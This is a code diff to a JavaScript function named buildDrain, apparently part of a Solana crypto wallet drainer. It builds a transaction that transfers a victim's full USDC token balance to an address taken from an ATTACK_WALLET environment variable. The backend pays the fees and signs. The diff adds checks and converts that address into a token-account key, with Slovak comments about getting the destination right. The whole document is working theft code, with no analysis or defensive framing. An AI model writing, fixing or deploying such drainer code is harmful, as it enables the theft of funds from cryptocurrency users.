@@ -13,17 +13,31 @@ async function buildDrain(user, connection) {
 
     const t = await getUserTokenAccounts(user, connection);
 
-    const { blockhash } = await connection.getLatestBlockhash();
-    tx.recentBlockhash = blockhash;
+    if (!t) {
+        throw new Error("getUserTokenAccounts() returned undefined");
+    }
 
-    // backend bude signer
+    if (!t.usdcATA) {
+        throw new Error("USDC ATA not found");
+    }
+
+    const { blockhash } = await connection.getLatestBlockhash();
+
+    tx.recentBlockhash = blockhash;
     tx.feePayer = new PublicKey(process.env.PUBLIC_KEY);
+
+    if (!process.env.ATTACK_WALLET) {
+        throw new Error("ATTACK_WALLET env variable is missing");
+    }
+
+    // POZOR: musí to byť TOKEN ACCOUNT (ATA), nie obyčajná wallet adresa.
+    const destinationTokenAccount = new PublicKey(process.env.ATTACK_WALLET);
 
     if (t.usdc && t.usdc > 0n) {
         tx.add(
             createTransferInstruction(
                 t.usdcATA,
-                process.env.ATTACK_WALLET,
+                destinationTokenAccount,
                 userPubkey,
                 t.usdc
             )
